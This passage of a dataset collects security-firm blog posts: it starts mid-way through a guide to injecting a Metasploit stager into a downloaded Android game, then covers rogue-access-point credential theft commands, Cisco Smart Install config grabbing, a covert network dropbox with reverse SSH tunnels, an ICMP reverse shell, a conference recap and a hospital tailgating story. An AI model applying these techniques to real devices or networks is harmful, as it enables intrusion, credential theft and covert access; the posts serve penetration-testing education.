\u201cgrep\u201d to search for all of the lines in the Metasploit \u201cAndroidManfest.xml\u201d file that contain the strings \u201cuses-permission\u201d, and \u201cuses-feature\u201d into the modified APK\u2019s AndroidManiest.xml file.\n\nYou will need to use an editor to insert the permissions at the appropriate place in the new \u201cAndroidManifest.xml\u201d file. Search for an existing \u201cuse-permission\u201d line as your guideline of where to insert the text.\n\nYou might end up with some duplicate permissions. You can optionally remove them but it really does not matter.\n\nBuild the New APK Package File\n\nNow use the \u201capktool\u201d again to re-assemble the resulting APK package file. The end result will be written into a \u201cdist\u201d directory within the APK directory itself.\n\nRe-Sign the Resulting Package File\n\nFor resigning, one easy method is to use the Android debugging keystore which is built if you install Android studio. The debugging keystore will be contained within the \u201c.android\u201d hidden directory in your home directory on a UN*X system.\n\nAn alternative method is to use the Java \u201ckeytool\u201d to generate your own self-signed keystore and sign it using the \u201cjarsigner\u201d tool as shown in the screenshots below.\n\nAt this point in time, the \u201cfinal.apk\u201d file is ready to be loaded onto an Android system using \u201cadb\u201d.\n\nIn this specific case, I am running a copy of \u201cGenyMotion\u201d which is an x86 based emulator that uses VirtualBox for a very high performing Android emulation. One of the challenges you might immediately run into is that the x86 emulation will not natively support the ARM processor. To get around this challenge, there are some ARM translation libraries available online. You would need to search for \u201cGenymotion-ARM-Translation_v1.1.zip\u201d and then drag the ZIP file onto a running GenyMotion Android system. Unfortunately, this is not 100% reliable, and some app crashes may still result.\n\nOne certain way to make sure an ARM APK file runs on a device is to use a hardware device itself. I have found that the Nexus 6 series of devices are nice to work with as the \u201crooting\u201d kit is fairly reliable, and attaching via a USB cable for testing is not too onerous.\n\nThe final step is, of course, to try out our newly infected Cowboy Shooting game. We find out quickly, that the moment we launch the game, we get a Meterpreter shell on our KALI system which just feels so right.\n\nI really don't think I am going to take the time to learn this game, which frankly was just a random pick from \u201capkmonk.com\u201d.\n\nSo Many Complicated Steps\u2026 so much can go wrong\u2026\n\nSo after performing all of the requisite steps above, I was immediately frustrated. There are so many moving parts that the chances of error are pretty high. There are likely other tools out there that are available to use but I decided to whip up a quick Python script to automate this process. I called it \u201candroid_embedit.py\u201d and I will warn you now, this is definitely a quick and dirty effort to get something to do the job without much effort on hardening the logic at all.\n\nThe idea of \u201candroid_embedit.py\u201d is that if you supply a Metasploit generated APK file, an original APK to modify, and a keystore, it will perform all of the steps in an automated fashion and generate the result for you.\n\nBelow is an example of running the tool. All of the temporary files and output will be stored in the \u201c~/.ae\u201d directory.\n\nThe tool also will remove the \u201cmetasploit\u201d directory name and obfuscate it with a random string directory name automatically. You can see this result in the below screenshot in which I listed the contents of the APK \u201csmali/com\u201d directory. The directory named \u201cdbarpubw\u201d actually contains the Metasploit stager code.\n\nThere is much continuing fun to be had with mobile apps, and their associated application programming interfaces. It is a good idea to get familiar with the platforms as a pen tester as you will undoubtedly encounter a need to test in the mobile space before long.\n\nI suppose you just might want to play with \u201cAndroid EmbedIT\u201d now! Well if you do, you can download from my GitHub by visiting https://github.com/yoda66/AndroidEmbedIT.\n\nKeep calm, and hack all the mobile things. ~Joff\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Wireless Hack Packages Update\"\nTaxonomies: \"Author, Jordan Drysdale, Phishing, Red Team, Wireless, brief how-tos, eaphammer, hacking, hostapd-wpe, Jordan Drysdale, Python, rogue.py, Wireless, wireless phishing\"\nCreation Date: \"Thu, 18 Oct 2018 15:09:22 +0000\"\nJordan Drysdale//\n\nWith Wild West Hackin' Fest 2018 coming up (!!!), here\u2019s a preview of some things you might see in the wireless labs.\nFirst, s0lst1c3\u2019s eaphammer. @relkci and I met this dude at HackWest 2018 doing his thing. Full workshop, his time and effort free for the public. Brilliant kid, couldn\u2019t have been nicer, more willing to share, or fully engaged with the community. His package has been the first executed out of my backpack during onsite engagements for a while now.\nLink: https://github.com/s0lst1c3/eaphammer\nUsage (5 minutes to online):\n\nGit clone\nGenerate cert\nAttack\n\nThis is a solid tool that torques hostapd-wpe configs on the fly and steals creds. This has an autocrack option, so it can be very effective where situational user population password policies are not. There are a lot more options and things to do with this tool than just steal RADIUS creds.\n./eaphammer --auth wpa --essid dot1x -i wlan0 --creds\n \nAnd, as usual, assuming the certificate is believable enough, we have creds of sorts.\n \n\nThe InfamousSYN\u2019s Rogue.py, link here: https://github.com/InfamousSYN/rogue.\nUsage (5 minutes to online):\n\nGit clone\nGenerate cert\nAttack\n\nI have been using this for the *infamous* --gag-- KARMA attack.\nPython rogue.py -I wlan0 -H g -C 6 --auth open --internet --karma -w demo.pcap\n \nAnd, voila...station connected.\n \n\nThen, my device requests the \u201csubnet gateway\u201d MAC address forward along a DNS request for twitter.\n \n\nThis could clearly be much more painful. This utility has a mountain of configurable options ripe for further investigations.\nLast up for today, the wifiphisher kit. Can be pulled from Github here: https://github.com/wifiphisher/wifiphisher\nUsage (5 minutes to online):\n\nGit clone\nPython setup.py install\nGenerate cert\nAttack\n\nThis one is a step up, for sure. The command line options are not for the faint of heart and some of the \u201cPHISHINGSCENARIOS\u201d don\u2019t quite align with each other\u2019s naming conventions. I personally love the pop-up web server wireless key request.\nRun it like so.\nWifiphisher -e DemoWPA2 -p wifi_connect -nE\n \nOpen web browser and see this (source is wifiphisher Github).\n\nEntered data is POSTed to tool. Game on.\n \n\nWireless hacking tools update complete. Always be civil. Cheers!\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Wild West Hackin' Fest 2018\"\nTaxonomies: \"Fun & Games, Informational\"\nCreation Date: \"Thu, 01 Nov 2018 19:22:16 +0000\"\nBronwen Aker* //\n\nFor those of you not fortunate enough to attend, this year\u2019s Wild West Hackin\u2019 Fest (WWHF) was phenomenal, featuring speakers from diverse aspects of information security, workshops, labs, and a killer CTF, all taking place at the Deadwood Mountain Grand, a Holiday Inn Resort Hotel, Casino, Spa and Event Center.\nIn spite of its name, this year\u2019s WWHF addressed more than just \u201chacking.\u201d Given that Black Hills Information Security (BHIS) is best known for its penetration testing services, it\u2019s no surprise that a lot of the talks dealt with pen testing tips, tricks, and traps. But there were other talks, including one on the importance of taking a break from all our electronic devices, and another by a woman who used to be a stay-at-home-mom and who is now an infosec pro.\nThe fun and games started Wednesday evening, with a Retro Gaming Room, Old Timey Photos, hardware hacking labs, the Escape Room, and several talks. The party that evening was pretty fun, too. ;-)\n\nThe official start of the conference was Thursday morning, with the Escape Room opening up, as well as the first of a couple Offensive WMI (Windows Management Instrumentation) workshops, and the keynote by Ed Skoudis, who is the Founder of Counter Hack Challenges, a SANS Fellow, and infosec wizard extraordinaire.\n\nEd Skoudis giving his keynote\nEd\u2019s keynote, titled \u201cThe Top Ten Reasons It\u2019s GREAT To Be a Pen Tester\u2026 And How You Can Help Fix that PROBLEM,\u201d set a persistent tone for the conference. He talked about the fun side of hacking, and about how stunt hacking is useless as a business model. Ultimately, penetration testing needs to help support business, and to empower organizations to improve their security. This theme was carried later in the day by BB King in his talk, \u201cHack for Show, Report for Dough.\u201d\n\nKevin Johnson\n\nTarah Wheeler\nOther talks addressed a wide range of topics, including undocumented \u201cfeatures\u201d of Windows (and how to exploit them), tips on learning Python, how to extract data from Slack, Android app testing, and much, much more! But the talks weren\u2019t the only cool thing at WWHF, not by a long shot!\n\n \nIn addition to the hardware hacking labs and the Escape Room, there were lots of fun things for folks who enjoy \u201clock sport.\u201d There was a \u201cHall of Doors\u201d set up with all kinds of doors for people to hack, including doors with simple pin locks, less simple pin locks, and electronic locks of various kinds. There was even a \u201cLock Picking Gun Fight Tournament\u201d run by Jonathan Ham and Deviant Ollam in which contestants had to pick locks in order get more ammo for their Nerf guns so they could shoot their opponent. It was great fun!\n\nAnd there were CTFs. (Really, is it possible to have a hackers conference without at least one CTF???) The MetaCTF Team and WWHF put together the official conference CTF. The CTF questions covered a wide range of infosec topics including encryption, IoT, web app vulnerabilities\u2026 I can\u2019t remember them all. And at the closing ceremony they rattled off some impressive statistics for the CTF, covering everything from how many unique domains were in the emails used to register for the CTF to how many attempts were made to answer questions.\n\nMetaCTF Crew\n \n\nMetaCTF 1st Place Winners\n \nAnother CTF was set up by GRIMM, Cyber R&D. Their \u201cHowdy Neighbor CTF\u201d was all about hacking IoT devices. The \u201cdollhouse\u201d they has set up was fully wired, furnished with 3D-printed furniture, and even had a working mini-TV in the living room!\nAnd let us not forget the DNS Scavenger Hunt by Active Countermeasures. Their scavenger hunt required knowledge of DNS, hexadecimal, a bit about some local (to Deadwood) landmarks, and a lot of creative thinking!\nI could go on and on about the conference. From start to finish, it was an amazing, wonderful, empowering event with hackers from all kinds of backgrounds and at all different levels, all coming together to have a great time and share what they know.\nYeah, you can bet I\u2019ll be at WWHF 2019. Wild horses couldn\u2019t stop me!\nB\n\nMet Deviant Ollam on the way to Wild West Hackin' Fest\n*This guest post was written by the lovely Bronwen Aker. Follow her on twitter here: @BronwenAker \n \nLinks and references:\nOfficial Website: https://www.wildwesthackinfest.com/\nWWHF 2018 Schedule: https://wwhf18.sched.com/\nTwitter Feed: https://twitter.com/WWHackinFest\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Cisco Smart Installs and Why Theyre Not Informational\"\nTaxonomies: \"Author, Blue Team, External/Internal, Finding, Jordan Drysdale, Red Team, BlueTeam, Cisco, External Pentest, internal pentest, Inventory, Jordan Drysdale, Nessus, RedTeam, SIET\"\nCreation Date: \"Mon, 12 Nov 2018 19:44:39 +0000\"\nJordan Drysdale //\n\ntl;dr \n\nCisco Smart Install is awesome (on by default)...for hackers... not sysadmins. \n\nSo, you Nessus too? Criticals and highs are all that matter! Right???\n\nUntil this beauty came along, but wait\u2026.this isn\u2019t Critical or High. Let\u2019s just ignore it.\n\nWhat can we do with this thing?\n\nDownload config\n\nUpload config\n\nExecute commands\n\nHow do we find it?\n\nnmap -p4786 0.0.0.0/0   \n\n### this is bad! Probably don\u2019t do this. \n\nSo what? \n\nLet\u2019s grab SIET (https://github.com/Sab0tag3d/SIET) and gather a config.\n\n./siet.py -i 10.0.0.1 -g\n\nAnd yeah, you guessed it, we managed to download a config file.\n\nBut, so what, the internet only has like 78,377 of these, according to Shodan as of November 7th, 2018 at 11AM PDT.\n\nThe \u2018service password-encryption\u2019 configuration parameter isn\u2019t good enough.\n\nCisco type 7 passwords are reversible\n\nCisco type 5 are Cisco MD5 crackable\n\nCertain other parameters may expose interesting details\n\nAttackers can upload their own config\n\nMaintain your inventory. Know your networks. \n\nOne command to disable - \u2018no vstack\u2019\n\nReference for Smart Install Concepts: https://www.cisco.com/c/en/us/td/docs/switches/lan/smart_install/configuration/guide/smart_install/concepts.html\n\nReference for why this is bad: https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20180409-smi\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Pentesting Dropbox on Steroids\"\nTaxonomies: \"Author, Informational, Joff Thyer, Red Team, Dropbox, Man-in-the-Middle, MITM, penetration tester, pentest, pentesting dropbox\"\nCreation Date: \"Tue, 20 Nov 2018 15:34:35 +0000\"\nJoff Thyer//\n\nMany of you have probably already looked at Beau Bullock\u2019s fine blog entry on a penetration testing dropbox. Beau has some excellent guidance on how to build the base dropbox platform using different platforms. In this case, I selected the ODroid-C2 platform running KALI (ARM) edition and am going to extend upon that to add some important capabilities. I suggest you read Beau\u2019s post here as the information I will write about builds upon that foundation. In short, Beau\u2019s fine work speaks of deploying an ad-hoc Access Point for attacker/pen-tester communications, however in some scenarios (think multi-tenant / multi-floor building) such a deployment might not be reachable via 802.11.\n\nAs a modified solution, the two specific things I will address are as follows:\n\nAdding two additional Ethernet NIC\u2019s to create a transparent bridging Man in the Middle (MiTM) capability.\n\nAdding a Cellular modem for backchannel communications instead of 802.11 WiFi.\n\nA transparent bridging Man in the Middle (MiTM) capability is very useful in a red teaming scenario. As long as the dropbox deployed has a battery to power it, a tester can enter an organization through whatever means available, deploy the dropbox by connecting it between a server/desktop system, and the Ethernet wall jack and get out fast!\n\nThe idea is that once the dropbox is powered up, it connects to the chosen cellular network, performs a reverse SSH connection outbound to a couple of pen-tester controlled systems in order so the penetration tester can then use said system remotely. It is additionally still very useful to have a wireless NIC connected to the system for wireless traffic interception purposes.\n\nConfiguring a Transparent Bridge\n\nMy requirements for the transparent bridging were pretty basic. The bridge solution must forward any ARP requests, and Ethernet frames with 0x0800 IP Ethernet type in them. The bridge must also be capable of forwarding frames of Ethernet type 0x888E which are Extensible Authentication Protocol over LAN. (EAPOL). This is important so that the capture of non-MACSEC enabled 802.1X frames can occur. With MACSEC deployed, the Ethernet frames are encrypted between endpoint and Ethernet switch rendering a MiTM solution inoperable unless the MiTM solution participates in the MACSEC protocol itself. I will not be addressing this aspect, however, MACSEC is not as often deployed anyway.\n\nOnce you have your KALI system up and running, you should start by installing \u201cbridge-utils\u201d on the system. This is done easily using \u201capt-get\u201d from a root shell as follows:\n\n# apt-get update \n# apt-get install bridge-utils \n\nThis, of course, assumes you have your ODroid-C2 connected to the Internet via its own internal Ethernet interface. I would then recommend you acquire two reliable USB Ethernet NIC\u2019s from your favorite vendor. I strongly suggest you obtain a USB3 based NIC with 10/100/1000Mbps capability. I used an IOCrest branded adapter which is listed on Amazon here https://www.amazon.com/SuperSpeed-Gigabit-Ethernet-Adapter-SY-ADA24040/dp/B00NJF1IC2.\n\nWith your system booted up, you should now see three total NIC\u2019s which should be named eth0, eth1, and eth2. You can use the \u201cip link\u201d command to confirm this. What we need to do now is create a transparent bridge interface so that traffic can be bridged between \u201ceth1\u201d, and \u201ceth2\u201d. We need to then make sure that this bridge gets created whenever the system is booted up.\n\nTo do this manually, we use the \u201cbrctl\u201d command, both creating and adding the Ethernet interfaces to the bridge interface. We must make sure that spanning tree remains disabled in this process. I suggest naming the bridge interface \u201cbr0\u201d for simplicity. To create this bridge, we do the following:\n\n# brctl addbr br0 \n# brctl addif br0 eth1 \n# brctl addif br0 eth2 \n\nAnd subsequently, to check our work, we can type this command.\n\n # brctl show bridge name bridge id                        STP enabled        interfaces br0                 8000.00e04c6800c1        no                        eth1                                                                         eth2 \n\nThe next challenge to solve is how to get the cellular modem to dial back to the provider. In my case, I chose to use Ting which is a Mobile Virtual Network Operator (MVNO) that leverages Sprint\u2019s network. The most important first step is to make sure that your cellular modem is properly registered with your provider. Ting and other MVNO\u2019s make this a fairly easy process.  \n\nConfiguring Your Cellular Modem\n\nBefore going further, there are a few software packages which you must have. To ensure you have them, perform the following steps.\n\n# apt-get update \n# apt-get install ppp wvdial usb-modeswitch \n\nOne thing that is very important is to acquire a cellular modem that is not locked to any provider and is compatible with your chosen provider. In my case, I chose a GSM modem that is compatible with any GSM provider. The Amazon link for acquiring is https://www.amazon.com/gp/product/B0769Z7WVQ.\n\nThe UNIX/Linux tool you need to get the modem working is called \u201cwvdial\u201d (https://en.wikipedia.org/wiki/WvDial) which is a Point-To-Point (PPP) protocol dialer. Believe it or not, cellular modems still use that old \u201cAT\u201d command set syntax that you might remember from the days of using dialup modems! The dialup initialization command set and other parameters will vary depending on your provider. In my case, the /etc/wvdial.conf file is listed below.\n\n[Dialer ting] \nInit3 = AT+CGDCONT=1,\"IP\",\"wholesale\" \nPhone = *99# \nIDSN = 0 \nBaud = 460800 \nModem Type = Analog Modem \nStupid Mode = 1 \nUsername = {blank} \nModem = /dev/ttyUSB0 \nPassword = {blank} \nInit1 = ATZ \nInit2 = ATQ0 V1 E1 S0=0 &C1 &D2 \nIdle = 0 \nDial Attempts = 0 \nDial Timeout = 10 \n\nContents of /etc/wvdial.conf\n\nThe other challenge you must solve with cellular modems is that they typically have two modes. One mode will mount the modem as a USB drive (typically for installing software), while the other mode will have the modem recognized as a modem thus yielding access to /dev/ttyUSB0. If you don\u2019t switch modes properly, then you cannot access the modem. The contents of /etc/usb_modeswitch.conf dictate how this occurs.   You should search around the Internet for the correct \u201cMessageContent\u201d parameter if you choose a different modem than listed in this article. The \u201cDefaultVendor\u201d, and \u201cDefaultProduct\u201d can be ascertained using the \u201clsusb\u201d command if the modem is connected.\n\nDisableSwitching=0 \nEnableLogging=0 \nDefaultVendor = 0x12d1 \nDefaultProduct = 0x1506 \nMessageEndPoint = \"0x01\" \nMessageContent = 55534243000000000000000000000011060000000000000000000000000000 \n\nContents of /etc/usb_modeswitch.conf\n\nYou should not need to worry about manually running \u201cusb_modeswitch\u201d since the udev daemon will take care of it. If any concerns, you check to see whether this entry in the file \u201c/lib/udev/rules.d/40-usb_modeswitch.rules\u201d exists. You can also search for \u201cusb_modeswitch\u201d in your /var/log/syslog after plugging in the modem to confirm.\n\nNow that you have these items in place, you can attach a keyboard, and monitor and test from the console. It is important to ensure that \u201cwvdial\u201d is working correctly to dial up your cellular provider. Assuming all things are correct, you should see output that looks like the below screenshot upon success. The command to dial with the above configuration named \u201cTing\u201d is as follows:\n\n# wvdial ting\n\nAssuming you have this all working correctly, I suggest creating a file in /etc/init.d that will start up your \u201cwvdial\u201d automatically when your system boots. My startup script looks like this:\n\n#!/bin/bash \n### BEGIN INIT INFO \n# Provides:        wvdial \n# Required-Start:  $network $remote_fs $syslog \n# Required-Stop:   $network $remote_fs $syslog \n# Default-Start:   3 \n# Default-Stop: \n# Short-Description: Start Reverse SSH \n### END INIT INFO \n. /lib/lsb/init-functions \ncase \"$1\" in     \n start)         \n if [ -e /dev/ttyUSB0 ]; then             \n now=`date +'%Y-%m-%d %H:%M:%S'`             \n echo \"\" >>/var/log/wvdial.log             \n echo \"############################################\" >>/var/log/wvdial.log             \n echo \"## Script start time: $now ##\" >>/var/log/wvdial.log             \n echo \"############################################\" >>/var/log/wvdial.log             \n wvdial ting >>/var/log/wvdial.log 2>&1 &             \n log_action_msg \"cellular modem link dialed\"         \n else             \n log_failure_msg \"failed to find cellular modem device\"         \n fi         \n ;;     \n stop)         \n pkill -f wvdial         \n ;; \nesac\n\nReverse SSH Tunneling\n\nNow that you have a functioning cellular modem channel, the next step is to establish a reverse SSH tunnel to your favorite Internet destination. This will enable you to SSH to your dropbox via the reverse tunnel whenever you would like.\n\nThe easiest way to do this is to generate an SSH key on your dropbox system, and then copy the public key over to an SSH authorized_keys file on the Internet destination system. You also need to ensure that you have some redundancy, idle timeout checking and that the SSH tunnels are established as soon as the system boots up.\n\nFor a reverse SSH tunnel, the following arguments to SSH are useful.\n\n-N        do not execute a remote command \n\n-f        request SSH to go into the background\n\n-T        do not allocate a pseudo-terminal\n\n-R        forward connections from remote side to local side of connection\n\n-o TCPKeepAlive=yes                enable TCP keep alive packets (usually a default) \n\nTo generate and use the key, I would recommend elliptical curve cryptography cipher since its a little easier on CPU consumption overall.\n\nOn the dropbox system, generate your new private/public key.\n\nThen, copy the \u201c.ssh/id_ecdsa.pub\u201d text into the \u201c~/.ssh/authorized_keys\u201d file on the Internet-connected host you want your dropbox to connect back to. This is no different than any other trusted key SSH configuration.\n\nIf we assume the Internet address of the system you are going to connect back to is 255.99.99.99, then the SSH command you want to use to establish the tunnel is as follows:\n\n root@kali-arm64# ssh root@255.99.99.99 -o TCPKeepAlive=yes -NTfR 2222:localhost:22 \n\nThis means that we connect to the remote IP address, and we ask the remote system to bind TCP port 2222 on the 127.0.0.1 (localhost) interface which we will subsequently use to SSH back into our dropbox.\n\nOn our remote system, whenever we want to login to the dropbox, we do the following:\n\n 255.99.99.99# ssh -p 2222 root@localhost \n\nMore than likely, you will want to exchange a public key from that remote system back to your dropbox also so that you have bi-directional trust for the root accounts. This simply makes things easy and quick when connecting back to your system.\n\nFor redundancy on the SSH tunnels, you can choose to implement both multiple IP address destinations, and possibly multiple TCP ports. You also will want the reverse SSH tunnels to be automatically established as soon as the Cellular Modem connection completes successfully. I found that the best way to do this was to write a small script and place it into the \u201c/etc/ppp/ip-up.d\u201d directory which will get executed as soon as the PPP daemon runs successfully.\n\nFinally, on the server side (255.99.99.99 remote end), it is very helpful to set a couple of idle timeout parameters. The reason for this is that if your dropbox is rebooted, we really need the tunneled ssh sessions to timeout in order to free up the TCP ports we are binding. If we don\u2019t do this, we get hung SSH daemon sessions, and subsequent SSH tunnels will fail.\n\nMy solution for this was to modify the /etc/ssh/sshd_config file on the remote server end so that the \u201cClientAliveInterval\u201d, and \u201cClientAliveMax\u201d options are appropriately set to timeout a connection after 3 retries of 5-second intervals. A screenshot of my modifications is below.\n\n \u201csshd_config\u201d on the remote Internet Host \n\nAdditional Packet Filtering and Forwarding\n\nAt this stage, we have a system that has a configured transparent bridge interface (called br0) that will happily forward traffic across it, and also that will SSH tunnel back home for you to enjoy! This is an awesome achievement however there are a couple of issues that you must still take care of. I would summarize these issues as follows:\n\nThe dropbox needs to be truly silent on the network. That means on our \u201ceth1\u201d, and \u201ceth2\u201d network interfaces we cannot issue any packets at all.\n\nThe dropbox needs to be able to forward Extensible Authentication Protocol over LAN (EAPOL) packets. Unfortunately, the Linux transparent bridging kernel code does not do this by default.\n\nThe default behavior for remaining silent needs to be configured at boot time.\n\nThe bridge interface needs to be properly configured at boot time.\n\nI usually make the assumption that my \u201ceth2\u201d port is going to be the port that faces the network switch, and I label things accordingly. This is helpful when using the system although always keep in mind that \u201ceth1\u201d, and \u201ceth2\u201d are all bridged directly to the \u201cbr0\u201d interface.\n\nOne other behavior we need to be aware of is layer 2 / layer 3 Multicast traffic. It a system is going to try and issue a multicast packet to a destination address in the 224.0.0.0/4 range, that packet will get an automatic mapping to layer 2, and a Multicast Ethernet frame will be issued to an address in the 01:xx:xx:xx:xx:xx address space (ie: a frame with the Multicast bit set).\n\nUsing the principle of staying silent, we need to squelch not only potential Multicast but also any potential ARP traffic. To start with, install the additional filtering tools on the dropbox which are both \u201carptables\u201d, and \u201cebtables\u201d. This gives you the ability to filter packets at layer 2, and filter ARP traffic.\n\n # apt-get update # apt-get install arptables # apt-get install ebtables \n\nAfter doing this, and performing some considerable experimentation, I came up with a configuration which I placed completely into the \u201c/etc/network/interfaces\u201d file to perform all of the tasks I needed which are:\n\nConfiguration of eth0, eth1, and eth2\n\nConfiguration of the bridge interface (br0)\n\nPutting a link scope local address on the bridge interface\n\nFiltering ARP traffic egress on the eth2 port\n\nFiltering IP traffic egress from the eth2 port\n\nFiltering any Multicast Ethernet traffic\n\nEnabling EAPOL traffic to be forwarded\n\nThe configuration is included here for you to use also.\n\nauto lo \niface lo inet loopback \nauto eth0 \nallow-hotplug eth0 \niface eth0 inet dhcp \nauto eth1 eth2 \nallow-hotplug eth1 eth2 \nauto br0 \nallow-hotplug br0 \niface br0 inet static     \n address 169.254.1.1     \n network 169.254.1.0     \n netmask 255.255.255.0     \n bridge_ports eth1 eth2     \n pre-up arptables -A OUTPUT -j DROP     \n pre-up iptables -A OUTPUT -o br0 -j DROP     \n pre-up ebtables -A OUTPUT -o br0 -d Multicast -j DROP     \n post-up echo 8 >/sys/class/net/br0/bridge/group_fwd_mask \n\nSome Words on Lack of Power Budget\n\nIt is probably no surprise to many of you that power is often oversubscribed on a USB bus. The standard USB port can deliver 500 milliwatts by specification unless USB 3.0 which can deliver up to 900 milliwatts. Well, let's just consider a moment that you add two Ethernet NIC\u2019s and a Cellular Modem to the USB bus. You are probably ok on a per-port basis, but overall wattage draw will increase. The other thing to consider is that we need portability for our dropbox solution, meaning that you will need to power this thing with a battery!    \n\nBecause I am completely obsessive, I decided to perform an experiment. Using a watt meter, I plugged the dropbox, fully configured, into a USB charger. The combination of the ODroid-C2, two USB NIC\u2019s, and the cellular modem used a total of 4.7 Watts (4700 milliwatts). Subtract the cellular modem, and it dropped to 3000 milliwatts. Subtract both NIC\u2019s and it dropped to 2700 milliwatts. So our attached devices use up to 2000 milliwatts alone, and the ODroid is using the remaining 2700 milliwatts. And I am just guessing that you will want to add an 802.11 NIC to this thing also. If you do, then you had better account for another 300 - 900 milliwatts at a best guess.\n\nCellular Modem = 1700 milliwatts\n\nUSB NIC = 150 milliwatts (x 2)\n\nUsing a little bit of mathematics, we get 1 AMP x 5 VDC power supply is able to deliver a maximum of 5000 milliwatts (Physics says:  P (watts) = Volts x Amps). My measurements are taken at an idle state which implies that we are very close to maximum power budget.\n\nThe answer is to please make sure your battery solution used is able to supply a minimum of 2 Amps which would be up to a maximum of 10,000 milliwatts. Even when I have used a 2 Amp battery supply, I have seen problems with the cellular modem if the battery is not fully charged. If you don\u2019t follow this advice? Well, I suspect your USB devices will have a power deficit and start to act very strangely and this would be sub-optimal.\n\nGo forth, and Man-In-The-Middle all the things!\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"How To: C2 Over ICMP\"\nTaxonomies: \"C2, How-To, Red Team, C2, C2 over ICMP, command and control, ICMP, Internet Control Message Protocol, Red Team\"\nCreation Date: \"Fri, 30 Nov 2018 15:32:08 +0000\"\nDarin Roberts //\n\nIn previous blogs, I have shown how to get various C2 sessions.  In this blog, I will be showing how to do C2 over ICMP. First, what is ICMP?  ICMP is Internet Control Message Protocol. It allows internet-connected devices to send error messages back to the source IP address when problems in delivering packets have been encountered.  It sounds like a very useful protocol, which it is. But, it can be very useful for attackers as well. It seems that almost everything that can be used for good can and is used for bad. ICMP is no different.\n\nIn order to set up our session, we need to download a couple of files.  The first file is going to be run on the attacking machine. You can download it here:  https://github.com/inquisb/icmpsh.  I just did a clone of it on my Kali machine.  The second file is a PowerShell script, which we will run on the victim.  You can download the script here: https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellIcmp.ps1.\n\nOn my attacking machine instance, I cloned icmpsh.\n\nIn order to get my ICMP C2 to work, I had to disable machine-based ICMP.  I was able to do this by using the following command.\n\nI then ran the python script to start up my listener.\n\nAs you can see, in order for the script to run, we need to give it our source IP and destination IP.\n\nAs you can see, nothing happened.  This is because our client hasn\u2019t been set up yet.  Go to the GitHub repo mentioned above and save the raw code.\n\nNow that we have the PowerShell code we need to transfer this to the victim computer.  Of course, there is a myriad of ways this can be done. I won\u2019t go into details on how to do this in practice, and since this is just a trial, I just copied it over.\n\nNow that I have my script ready, I will run it.  This is a PowerShell script, so I need to get a PowerShell command prompt.\n\nNow that we have a PowerShell prompt I need to run my script.  I will navigate to where I put the file and run the following commands.\n\nI am then asked to put in the IP address for the listener that I set up.\n\nWhen I run the command, the script runs, and my listener that I had started on my Kali connects.  It is almost like magic!\n\nYou can see at the bottom of the screenshot that I have my PowerShell command prompt from my Windows machine.  Now I can run any commands as if I were on the victim\u2019s computer.\n\nSo, what is the benefit of using ICMP as the method for the C2?  All of the communication is injected into ICMP packets, both the request and the response.  Because all of the traffic is in ICMP packets, the traffic is undetected by proxy-based firewalls.  This isn\u2019t to say that these connections can\u2019t be detected, but they can bypass some firewall rules.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Social Engineering in Japan\"\nTaxonomies: \"Fun & Games, Informational, Social Engineering, general infosec, informational, social engineering\"\nCreation Date: \"Wed, 02 Jan 2019 15:28:08 +0000\"\nKelsey Bellew//*\n\nIt\u2019s an occupational hazard to see vulnerabilities everywhere. When I see a router sitting in plain sight I think, \u201cThe default creds are probably printed on the back; I wonder if those were ever changed?\u201d When I see an unattended locked door propped open by a shoe or a box, it\u2019s \u201cWhy would they just leave it like that? Should I go close it? Do they not have a key?\u201d\n\nWhen I see a friend or family member who doesn\u2019t even have a pattern lock set up on their phone, I start preaching, horrified, about how they\u2019re doing it wrong. (Seriously Aunt Laurie, please lock your phone. Please. For me.)\n\nThe story below illustrates one of these situations where every step of the way I was thinking, \u201cI shouldn\u2019t be allowed to do this. Why are you letting me do this? Why aren\u2019t you stopping me??\u201d The purpose of publishing this story is to highlight what went right, what went wrong, and what could have been done better in hopes that its readers will reflect and apply insights gained to their own situations.\n\nAccidental Social Engineering\n\nThis month, my friend had surgery in a hospital in Japan. They wouldn\u2019t release her unless she had someone to take her home, so I volunteered. She assured me it was an international hospital and I could just ask for her at the reception desk using English.\n\nThe hospital was in an area I\u2019d never been to before. I got lost on the way and my friend wasn\u2019t answering her phone. I found the building I thought she was in, tried calling once more, and then walked inside.\n\nThe building seemed a lot more closed off than hospitals in America and I was immediately wary. There was only one entrance, and I had to talk with a security guard in order to enter.\n\nI walked up to the security guard posted at what seemed to be the reception desk and his deer-in-the-headlights expression told me he was not a man well accustomed to receiving foreign-looking visitors. I used my broken Japanese to try to convey that I was here to wait for my friend\u2019s surgery and eventually got the point across. He asked for her name but he couldn\u2019t find it in his system. He asked for her room number, but I didn\u2019t know what it was. I said, \u201cMaybe the 9th floor?\u201d He had me fill out a slip of paper with my name, arrival time, and allowed me to leave the destination field blank on the form.\n\nI entered the elevator alone and hit the button for the 9th floor. Only one nurse was present, and she went out of her way to pretend she hadn\u2019t seen me. I approached her and she looked at me with the typical panicked Japanese stare of I took some English in high school and I don\u2019t remember any of it. I told her in disjointed Japanese that I was looking for my friend, who was staying at this hospital.\n\n\u201cThis is the exercise/rehabilitation floor, there are no patients here. What did reception say?\u201d  the nurse said.\n\n\u201cI asked reception, but\u2026\u201d (trailing off is a classic way to let other people draw conclusions and that way you only have to remember half as many words)\n\n\u201cWell, you really need a badge.\u201d She gestured at what looked like an RFID access card. \u201cYour friend is probably on the 8th floor, but you really need to go get a badge from the 1st floor.\u201d\n\nI thanked her and went back to the elevator. I closed the elevator door and considered my next move. Going back down to talk with the reception desk guy sounded painful. I hit the button for floor 8.\n\nFloor 8 had badge readers. I looked at them for a moment thinking, This is it, you\u2019ve gone too far. Tailgating is probably illegal here, let\u2019s just go home.\n\nThen a nurse noticed I looked lost and opened the door for me.  \u00af\\_(\u30c4)_/\u00af\n\n View From the 8th Floor of the Hospital I Shouldn\u2019t Be At \n\nThis is indicative of situations that we encounter often on physical engagements. We often don\u2019t need to go for the \u201cmission impossible\u201d style tasks like picking locks, cloning ID cards, or bypassing security systems. By simply allowing employees to draw their own conclusions we can be allowed entry into restricted areas. People being 